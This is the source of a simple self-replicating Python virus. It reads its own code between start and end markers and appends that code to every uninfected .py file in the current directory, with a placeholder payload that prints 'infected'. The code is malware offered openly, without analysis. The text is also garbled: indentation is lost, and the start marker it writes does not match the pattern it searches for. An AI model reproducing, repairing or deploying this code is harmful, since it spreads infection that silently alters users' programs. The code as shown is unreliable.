# start
import sys
import re
import glob
# put a copy of all these lines
virusCode = []
# open this file and read all lines
# filter out all lines that are not inside the virus code boundary
thisFile = sys.argv[0]
virusFile = open(thisFile, "r")
lines = virusFile.readlines()
virusFile.close()
# save the lines into list to use later
inVirus = False
for line in lines:
if(re.search("^#start", line)):
inVirus = True
# if virus code has been found,start appending
# lines to virusCode list. we assume that the code is always appended of script
if (inVirus == True):
virusCode.append(line)
if re.search("^#end", line):
break
# find potential victims
programs = glob.glob("*.py")
# check and infect all programs that globally found
for p in programs:
file = open(p, "r")
programCode = file.readlines()
file.close()
# check to see if file is infected already
infected = False
for line in programCode:
if (re.search("^#start", line)):
infected = True
break
# stop we dont need to try to infect this
if not infected:
newCode = []
newCode = programCode
newCode.extend(virusCode)
# write the new version to file
file = open(p, "w")
file.writelines(newCode)
file.close()
# payload-do evil work
print("infected")
# end
